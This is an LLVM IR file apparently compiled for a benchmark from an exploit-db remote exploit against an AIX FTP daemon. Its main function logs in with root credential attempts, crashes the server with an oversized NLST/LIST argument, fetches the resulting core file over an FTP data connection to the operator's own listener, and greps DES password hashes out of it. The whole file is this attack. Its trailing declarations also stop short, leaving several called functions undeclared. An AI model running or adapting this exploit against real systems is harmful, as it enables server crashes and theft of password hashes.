; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/remote/extr_14456.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/remote/extr_14456.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [4 x i8] c"ftp\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"guest\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"pub\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"root\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"21\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"h:i:p:l:k:d:c:s\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = external dso_local global i8*, align 8
@stderr = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [34 x i8] c"populating DES hash in memory...\0A\00", align 1
@out = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"PASS abcdef\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"logging in...\0A\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [23 x i8] c"changing directory...\0A\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"CWD %s\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [38 x i8] c"triggering segmentation violation...\0A\00", align 1
@.str.14 = private unnamed_addr constant [11 x i8] c"NLST ~%s\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [11 x i8] c"LIST ~%s\0D\0A\00", align 1
@in = common dso_local global i8* null, align 8
@.str.16 = private unnamed_addr constant [59 x i8] c"trigger succeeded!\0Awaiting for core file to be created...\0A\00", align 1
@.str.17 = private unnamed_addr constant [93 x i8] c"trigger seems to have failed, proceeding anyways...\0A\0Awaiting for core file to be created...\0A\00", align 1
@.str.18 = private unnamed_addr constant [24 x i8] c"logging in 2nd time...\0A\00", align 1
@.str.19 = private unnamed_addr constant [22 x i8] c"getting core file...\0A\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"TYPE I\0D\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.21 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.22 = private unnamed_addr constant [25 x i8] c"PORT %d,%d,%d,%d,%d,%d\0D\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.23 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"bind\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.26 = private unnamed_addr constant [12 x i8] c"RETR core\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [4 x i8] c"150\00", align 1
@.str.28 = private unnamed_addr constant [37 x i8] c"core file not found... terminating.\0A\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"core\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@.str.30 = private unnamed_addr constant [24 x i8] c"open on local core file\00", align 1
@.str.31 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.32 = private unnamed_addr constant [63 x i8] c"finally extracting DES hashes from core file for user '%s'...\0A\00", align 1
@.str.33 = private unnamed_addr constant [42 x i8] c"strings core | grep '^[A-Za-z0-9]\\{13\\}$'\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"done.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca [4 x i32], align 16
  %25 = alloca i32, align 4
  %26 = alloca %struct.sockaddr_in, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i8* null, i8** %15, align 8
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8** %16, align 8
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i8** %17, align 8
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i8** %18, align 8
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8** %19, align 8
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8** %20, align 8
  store i32 0, i32* %21, align 4
  store i8* null, i8** %22, align 8
  store i8* null, i8** %23, align 8
  store i8* null, i8** %28, align 8
  br label %29

29:                                               ; preds = %106, %2
  %30 = load i32, i32* %4, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = call i32 @getopt(i32 %30, i8** %31, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  store i32 %32, i32* %11, align 4
  %33 = load i32, i32* @EOF, align 4
  %34 = icmp ne i32 %32, %33
  br i1 %34, label %35, label %107

35:                                               ; preds = %29
  %36 = load i32, i32* %11, align 4
  switch i32 %36, label %101 [
    i32 104, label %37
    i32 105, label %46
    i32 112, label %55
    i32 108, label %64
    i32 107, label %73
    i32 100, label %82
    i32 99, label %91
    i32 115, label %100
  ]

37:                                               ; preds = %35
  %38 = load i8*, i8** @optarg, align 8
  %39 = call i32 @strlen(i8* %38)
  %40 = add nsw i32 %39, 1
  %41 = call i64 @malloc(i32 %40)
  %42 = inttoptr i64 %41 to i8*
  store i8* %42, i8** %15, align 8
  %43 = load i8*, i8** %15, align 8
  %44 = load i8*, i8** @optarg, align 8
  %45 = call i32 @strcpy(i8* %43, i8* %44)
  br label %106

46:                                               ; preds = %35
  %47 = load i8*, i8** @optarg, align 8
  %48 = call i32 @strlen(i8* %47)
  %49 = add nsw i32 %48, 1
  %50 = call i64 @malloc(i32 %49)
  %51 = inttoptr i64 %50 to i8*
  store i8* %51, i8** %22, align 8
  %52 = load i8*, i8** %22, align 8
  %53 = load i8*, i8** @optarg, align 8
  %54 = call i32 @strcpy(i8* %52, i8* %53)
  br label %106

55:                                               ; preds = %35
  %56 = load i8*, i8** @optarg, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = add nsw i32 %57, 1
  %59 = call i64 @malloc(i32 %58)
  %60 = inttoptr i64 %59 to i8*
  store i8* %60, i8** %20, align 8
  %61 = load i8*, i8** %20, align 8
  %62 = load i8*, i8** @optarg, align 8
  %63 = call i32 @strcpy(i8* %61, i8* %62)
  br label %106

64:                                               ; preds = %35
  %65 = load i8*, i8** @optarg, align 8
  %66 = call i32 @strlen(i8* %65)
  %67 = add nsw i32 %66, 1
  %68 = call i64 @malloc(i32 %67)
  %69 = inttoptr i64 %68 to i8*
  store i8* %69, i8** %16, align 8
  %70 = load i8*, i8** %16, align 8
  %71 = load i8*, i8** @optarg, align 8
  %72 = call i32 @strcpy(i8* %70, i8* %71)
  store i32 1, i32* %6, align 4
  br label %106

73:                                               ; preds = %35
  %74 = load i8*, i8** @optarg, align 8
  %75 = call i32 @strlen(i8* %74)
  %76 = add nsw i32 %75, 1
  %77 = call i64 @malloc(i32 %76)
  %78 = inttoptr i64 %77 to i8*
  store i8* %78, i8** %17, align 8
  %79 = load i8*, i8** %17, align 8
  %80 = load i8*, i8** @optarg, align 8
  %81 = call i32 @strcpy(i8* %79, i8* %80)
  store i32 1, i32* %7, align 4
  br label %106

82:                                               ; preds = %35
  %83 = load i8*, i8** @optarg, align 8
  %84 = call i32 @strlen(i8* %83)
  %85 = add nsw i32 %84, 1
  %86 = call i64 @malloc(i32 %85)
  %87 = inttoptr i64 %86 to i8*
  store i8* %87, i8** %18, align 8
  %88 = load i8*, i8** %18, align 8
  %89 = load i8*, i8** @optarg, align 8
  %90 = call i32 @strcpy(i8* %88, i8* %89)
  br label %106

91:                                               ; preds = %35
  %92 = load i8*, i8** @optarg, align 8
  %93 = call i32 @strlen(i8* %92)
  %94 = add nsw i32 %93, 1
  %95 = call i64 @malloc(i32 %94)
  %96 = inttoptr i64 %95 to i8*
  store i8* %96, i8** %19, align 8
  %97 = load i8*, i8** %19, align 8
  %98 = load i8*, i8** @optarg, align 8
  %99 = call i32 @strcpy(i8* %97, i8* %98)
  br label %106

100:                                              ; preds = %35
  store i32 1, i32* %21, align 4
  br label %106

101:                                              ; preds = %35
  %102 = load i8**, i8*** %5, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 0
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @usage(i8* %104)
  br label %106

106:                                              ; preds = %101, %100, %91, %82, %73, %64, %55, %46, %37
  br label %29

107:                                              ; preds = %29
  %108 = load i8*, i8** %15, align 8
  %109 = icmp eq i8* %108, null
  br i1 %109, label %113, label %110

110:                                              ; preds = %107
  %111 = load i8*, i8** %22, align 8
  %112 = icmp eq i8* %111, null
  br i1 %112, label %113, label %118

113:                                              ; preds = %110, %107
  %114 = load i8**, i8*** %5, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 0
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @usage(i8* %116)
  br label %118

118:                                              ; preds = %113, %110
  %119 = load i32, i32* %6, align 4
  %120 = icmp ne i32 %119, 0
  br i1 %120, label %121, label %124

121:                                              ; preds = %118
  %122 = load i32, i32* %7, align 4
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %124, label %130

124:                                              ; preds = %121, %118
  %125 = load i32, i32* %6, align 4
  %126 = icmp ne i32 %125, 0
  br i1 %126, label %135, label %127

127:                                              ; preds = %124
  %128 = load i32, i32* %7, align 4
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %135

130:                                              ; preds = %127, %121
  %131 = load i8**, i8*** %5, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 0
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @usage(i8* %133)
  br label %135

135:                                              ; preds = %130, %127, %124
  %136 = load i8*, i8** %15, align 8
  %137 = load i8*, i8** %20, align 8
  %138 = call i32 @createconnection(i8* %136, i8* %137)
  store i32 %138, i32* %8, align 4
  %139 = load i32, i32* %8, align 4
  %140 = call i32 @getline(i32 %139)
  %141 = load i32, i32* @stderr, align 4
  %142 = call i32 (i32, i8*, ...) @fprintf(i32 %141, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %12, align 4
  br label %143

143:                                              ; preds = %162, %135
  %144 = load i32, i32* %12, align 4
  %145 = icmp slt i32 %144, 3
  br i1 %145, label %146, label %165

146:                                              ; preds = %143
  %147 = load i32, i32* @out, align 4
  %148 = load i8*, i8** %19, align 8
  %149 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %147, i32 4, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i8* %148)
  %150 = load i32, i32* %8, align 4
  %151 = load i32, i32* @out, align 4
  %152 = call i32 @putline(i32 %150, i32 %151)
  %153 = load i32, i32* %8, align 4
  %154 = call i32 @getline(i32 %153)
  %155 = load i32, i32* @out, align 4
  %156 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %155, i32 4, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0))
  %157 = load i32, i32* %8, align 4
  %158 = load i32, i32* @out, align 4
  %159 = call i32 @putline(i32 %157, i32 %158)
  %160 = load i32, i32* %8, align 4
  %161 = call i32 @getline(i32 %160)
  br label %162

162:                                              ; preds = %146
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %12, align 4
  br label %143

165:                                              ; preds = %143
  %166 = load i32, i32* @stderr, align 4
  %167 = call i32 (i32, i8*, ...) @fprintf(i32 %166, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0))
  %168 = load i32, i32* @out, align 4
  %169 = load i8*, i8** %16, align 8
  %170 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %168, i32 4, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i8* %169)
  %171 = load i32, i32* %8, align 4
  %172 = load i32, i32* @out, align 4
  %173 = call i32 @putline(i32 %171, i32 %172)
  %174 = load i32, i32* %8, align 4
  %175 = call i32 @getline(i32 %174)
  %176 = load i32, i32* @out, align 4
  %177 = load i8*, i8** %17, align 8
  %178 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %176, i32 4, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0), i8* %177)
  %179 = load i32, i32* %8, align 4
  %180 = load i32, i32* @out, align 4
  %181 = call i32 @putline(i32 %179, i32 %180)
  %182 = load i32, i32* %8, align 4
  %183 = call i32 @getline(i32 %182)
  %184 = load i32, i32* %8, align 4
  %185 = call i32 @getline(i32 %184)
  %186 = load i32, i32* @stderr, align 4
  %187 = call i32 (i32, i8*, ...) @fprintf(i32 %186, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0))
  %188 = load i32, i32* @out, align 4
  %189 = load i8*, i8** %18, align 8
  %190 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %188, i32 4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0), i8* %189)
  %191 = load i32, i32* %8, align 4
  %192 = load i32, i32* @out, align 4
  %193 = call i32 @putline(i32 %191, i32 %192)
  %194 = load i32, i32* %8, align 4
  %195 = call i32 @getline(i32 %194)
  %196 = load i32, i32* @stderr, align 4
  %197 = call i32 (i32, i8*, ...) @fprintf(i32 %196, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.13, i64 0, i64 0))
  %198 = call i64 @malloc(i32 2000)
  %199 = inttoptr i64 %198 to i8*
  store i8* %199, i8** %23, align 8
  %200 = load i8*, i8** %23, align 8
  %201 = call i32 @memset(i8* %200, i8 signext 65, i32 2000)
  %202 = load i8*, i8** %23, align 8
  %203 = getelementptr inbounds i8, i8* %202, i64 1999
  store i8 0, i8* %203, align 1
  %204 = load i32, i32* %21, align 4
  %205 = icmp ne i32 %204, 0
  br i1 %205, label %210, label %206

206:                                              ; preds = %165
  %207 = load i32, i32* @out, align 4
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %207, i32 4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.14, i64 0, i64 0), i8* %208)
  br label %214

210:                                              ; preds = %165
  %211 = load i32, i32* @out, align 4
  %212 = load i8*, i8** %23, align 8
  %213 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %211, i32 4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.15, i64 0, i64 0), i8* %212)
  br label %214

214:                                              ; preds = %210, %206
  %215 = load i32, i32* %8, align 4
  %216 = load i32, i32* @out, align 4
  %217 = call i32 @putline(i32 %215, i32 %216)
  %218 = load i8*, i8** @in, align 8
  %219 = call i32 @memset(i8* %218, i8 signext 0, i32 8)
  %220 = load i32, i32* %8, align 4
  %221 = load i8*, i8** @in, align 8
  %222 = call i32 @recv(i32 %220, i8* %221, i32 8, i32 0)
  %223 = icmp slt i32 %222, 1
  br i1 %223, label %224, label %226

224:                                              ; preds = %214
  %225 = call i32 @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.16, i64 0, i64 0))
  br label %228

226:                                              ; preds = %214
  %227 = call i32 @printf(i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.17, i64 0, i64 0))
  br label %228

228:                                              ; preds = %226, %224
  %229 = call i32 @sleep(i32 5)
  %230 = load i32, i32* %8, align 4
  %231 = call i32 @close(i32 %230)
  %232 = load i8*, i8** %15, align 8
  %233 = load i8*, i8** %20, align 8
  %234 = call i32 @createconnection(i8* %232, i8* %233)
  store i32 %234, i32* %8, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @getline(i32 %235)
  %237 = load i32, i32* @stderr, align 4
  %238 = call i32 (i32, i8*, ...) @fprintf(i32 %237, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.18, i64 0, i64 0))
  %239 = load i32, i32* @out, align 4
  %240 = load i8*, i8** %16, align 8
  %241 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %239, i32 4, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i8* %240)
  %242 = load i32, i32* %8, align 4
  %243 = load i32, i32* @out, align 4
  %244 = call i32 @putline(i32 %242, i32 %243)
  %245 = load i32, i32* %8, align 4
  %246 = call i32 @getline(i32 %245)
  %247 = load i32, i32* @out, align 4
  %248 = load i8*, i8** %17, align 8
  %249 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %247, i32 4, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0), i8* %248)
  %250 = load i32, i32* %8, align 4
  %251 = load i32, i32* @out, align 4
  %252 = call i32 @putline(i32 %250, i32 %251)
  %253 = load i32, i32* %8, align 4
  %254 = call i32 @getline(i32 %253)
  %255 = load i32, i32* %8, align 4
  %256 = call i32 @getline(i32 %255)
  %257 = load i32, i32* @stderr, align 4
  %258 = call i32 (i32, i8*, ...) @fprintf(i32 %257, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0))
  %259 = load i32, i32* @out, align 4
  %260 = load i8*, i8** %18, align 8
  %261 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %259, i32 4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0), i8* %260)
  %262 = load i32, i32* %8, align 4
  %263 = load i32, i32* @out, align 4
  %264 = call i32 @putline(i32 %262, i32 %263)
  %265 = load i32, i32* %8, align 4
  %266 = call i32 @getline(i32 %265)
  %267 = load i32, i32* @stderr, align 4
  %268 = call i32 (i32, i8*, ...) @fprintf(i32 %267, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.19, i64 0, i64 0))
  %269 = load i32, i32* @out, align 4
  %270 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %269, i32 4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0))
  %271 = load i32, i32* %8, align 4
  %272 = load i32, i32* @out, align 4
  %273 = call i32 @putline(i32 %271, i32 %272)
  %274 = load i32, i32* %8, align 4
  %275 = call i32 @getline(i32 %274)
  %276 = call i32 (...) @getpid()
  %277 = add nsw i32 %276, 1024
  store i32 %277, i32* %25, align 4
  store i32 12, i32* %13, align 4
  %278 = call i32 @bzero(%struct.sockaddr_in* %26, i32 12)
  %279 = load i32, i32* @AF_INET, align 4
  %280 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 2
  store i32 %279, i32* %280, align 4
  %281 = load i32, i32* %25, align 4
  %282 = call i32 @htons(i32 %281)
  %283 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i32 %282, i32* %283, align 4
  %284 = load i32, i32* @INADDR_ANY, align 4
  %285 = call i32 @htonl(i32 %284)
  %286 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  %287 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %286, i32 0, i32 0
  store i32 %285, i32* %287, align 4
  %288 = load i8*, i8** %22, align 8
  %289 = call i64 @strtok(i8* %288, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0))
  %290 = inttoptr i64 %289 to i8*
  store i8* %290, i8** %28, align 8
  %291 = load i8*, i8** %28, align 8
  %292 = call i32 @atoi(i8* %291)
  %293 = getelementptr inbounds [4 x i32], [4 x i32]* %24, i64 0, i64 0
  store i32 %292, i32* %293, align 16
  %294 = call i64 @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0))
  %295 = inttoptr i64 %294 to i8*
  store i8* %295, i8** %28, align 8
  %296 = load i8*, i8** %28, align 8
  %297 = call i32 @atoi(i8* %296)
  %298 = getelementptr inbounds [4 x i32], [4 x i32]* %24, i64 0, i64 1
  store i32 %297, i32* %298, align 4
  %299 = call i64 @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0))
  %300 = inttoptr i64 %299 to i8*
  store i8* %300, i8** %28, align 8
  %301 = load i8*, i8** %28, align 8
  %302 = call i32 @atoi(i8* %301)
  %303 = getelementptr inbounds [4 x i32], [4 x i32]* %24, i64 0, i64 2
  store i32 %302, i32* %303, align 8
  %304 = call i64 @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0))
  %305 = inttoptr i64 %304 to i8*
  store i8* %305, i8** %28, align 8
  %306 = load i8*, i8** %28, align 8
  %307 = call i32 @atoi(i8* %306)
  %308 = getelementptr inbounds [4 x i32], [4 x i32]* %24, i64 0, i64 3
  store i32 %307, i32* %308, align 4
  %309 = load i32, i32* @out, align 4
  %310 = getelementptr inbounds [4 x i32], [4 x i32]* %24, i64 0, i64 0
  %311 = load i32, i32* %310, align 16
  %312 = getelementptr inbounds [4 x i32], [4 x i32]* %24, i64 0, i64 1
  %313 = load i32, i32* %312, align 4
  %314 = getelementptr inbounds [4 x i32], [4 x i32]* %24, i64 0, i64 2
  %315 = load i32, i32* %314, align 8
  %316 = getelementptr inbounds [4 x i32], [4 x i32]* %24, i64 0, i64 3
  %317 = load i32, i32* %316, align 4
  %318 = load i32, i32* %25, align 4
  %319 = sdiv i32 %318, 256
  %320 = load i32, i32* %25, align 4
  %321 = srem i32 %320, 256
  %322 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %309, i32 4, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.22, i64 0, i64 0), i32 %311, i32 %313, i32 %315, i32 %317, i32 %319, i32 %321)
  %323 = load i32, i32* %8, align 4
  %324 = load i32, i32* @out, align 4
  %325 = call i32 @putline(i32 %323, i32 %324)
  %326 = load i32, i32* %8, align 4
  %327 = call i32 @getline(i32 %326)
  %328 = load i32, i32* @AF_INET, align 4
  %329 = load i32, i32* @SOCK_STREAM, align 4
  %330 = call i32 @socket(i32 %328, i32 %329, i32 0)
  store i32 %330, i32* %9, align 4
  %331 = icmp slt i32 %330, 0
  br i1 %331, label %332, label %334

332:                                              ; preds = %228
  %333 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %422

334:                                              ; preds = %228
  %335 = load i32, i32* %9, align 4
  %336 = bitcast %struct.sockaddr_in* %26 to %struct.sockaddr*
  %337 = call i64 @bind(i32 %335, %struct.sockaddr* %336, i32 12)
  %338 = icmp slt i64 %337, 0
  br i1 %338, label %339, label %344

339:                                              ; preds = %334
  %340 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0))
  %341 = load i32, i32* %9, align 4
  %342 = call i32 @close(i32 %341)
  %343 = call i32 @exit(i32 1) #3
  unreachable

344:                                              ; preds = %334
  %345 = load i32, i32* %9, align 4
  %346 = call i64 @listen(i32 %345, i32 10)
  %347 = icmp slt i64 %346, 0
  br i1 %347, label %348, label %353

348:                                              ; preds = %344
  %349 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0))
  %350 = load i32, i32* %9, align 4
  %351 = call i32 @close(i32 %350)
  %352 = call i32 @exit(i32 1) #3
  unreachable

353:                                              ; preds = %344
  %354 = load i32, i32* @out, align 4
  %355 = call i32 (i32, i32, i8*, ...) @snprintf(i32 %354, i32 4, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.26, i64 0, i64 0))
  %356 = load i32, i32* %8, align 4
  %357 = load i32, i32* @out, align 4
  %358 = call i32 @putline(i32 %356, i32 %357)
  %359 = load i32, i32* %8, align 4
  %360 = call i32 @getline(i32 %359)
  %361 = load i8*, i8** @in, align 8
  %362 = call i32* @strstr(i8* %361, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.27, i64 0, i64 0))
  %363 = icmp eq i32* %362, null
  br i1 %363, label %364, label %370

364:                                              ; preds = %353
  %365 = load i32, i32* @stderr, align 4
  %366 = call i32 (i32, i8*, ...) @fprintf(i32 %365, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.28, i64 0, i64 0))
  %367 = load i32, i32* %8, align 4
  %368 = call i32 @close(i32 %367)
  %369 = call i32 @exit(i32 1) #3
  unreachable

370:                                              ; preds = %353
  %371 = load i32, i32* @O_WRONLY, align 4
  %372 = load i32, i32* @O_CREAT, align 4
  %373 = or i32 %371, %372
  %374 = call i32 @open(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i64 0, i64 0), i32 %373)
  store i32 %374, i32* %14, align 4
  %375 = load i32, i32* %14, align 4
  %376 = icmp eq i32 %375, -1
  br i1 %376, label %377, label %382

377:                                              ; preds = %370
  %378 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.30, i64 0, i64 0))
  %379 = load i32, i32* %8, align 4
  %380 = call i32 @close(i32 %379)
  %381 = call i32 @exit(i32 1) #3
  unreachable

382:                                              ; preds = %370
  %383 = call i32 @sleep(i32 1)
  %384 = load i32, i32* %9, align 4
  %385 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  %386 = call i32 @accept(i32 %384, %struct.sockaddr* %385, i32* %13)
  store i32 %386, i32* %10, align 4
  %387 = icmp slt i32 %386, 0
  br i1 %387, label %388, label %393

388:                                              ; preds = %382
  %389 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.31, i64 0, i64 0))
  %390 = load i32, i32* %8, align 4
  %391 = call i32 @close(i32 %390)
  %392 = call i32 @exit(i32 1) #3
  unreachable

393:                                              ; preds = %382
  br label %394

394:                                              ; preds = %406, %393
  %395 = load i32, i32* %10, align 4
  %396 = load i8*, i8** @in, align 8
  %397 = call i32 @recv(i32 %395, i8* %396, i32 8, i32 0)
  store i32 %397, i32* %12, align 4
  %398 = load i32, i32* %12, align 4
  %399 = icmp slt i32 %398, 1
  br i1 %399, label %400, label %401

400:                                              ; preds = %394
  br label %409

401:                                              ; preds = %394
  %402 = load i32, i32* %14, align 4
  %403 = load i8*, i8** @in, align 8
  %404 = load i32, i32* %12, align 4
  %405 = call i32 @write(i32 %402, i8* %403, i32 %404)
  br label %406

406:                                              ; preds = %401
  %407 = load i32, i32* %12, align 4
  %408 = icmp sgt i32 %407, 0
  br i1 %408, label %394, label %409

409:                                              ; preds = %406, %400
  %410 = load i32, i32* %10, align 4
  %411 = call i32 @close(i32 %410)
  %412 = load i32, i32* %14, align 4
  %413 = call i32 @close(i32 %412)
  %414 = load i32, i32* %8, align 4
  %415 = call i32 @close(i32 %414)
  %416 = load i32, i32* @stderr, align 4
  %417 = load i8*, i8** %19, align 8
  %418 = call i32 (i32, i8*, ...) @fprintf(i32 %416, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.32, i64 0, i64 0), i8* %417)
  %419 = call i32 @system(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.33, i64 0, i64 0))
  %420 = load i32, i32* @stderr, align 4
  %421 = call i32 (i32, i8*, ...) @fprintf(i32 %420, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %422

422:                                              ; preds = %409, %332
  %423 = load i32, i32* %3, align 4
  ret i32 %423
}

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @createconnection(i8*, i8*) #1

declare dso_local i32 @getline(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @snprintf(i32, i32, i8*, ...) #1

declare dso_local i32 @putline(i32, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i64 @strtok(i8*, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

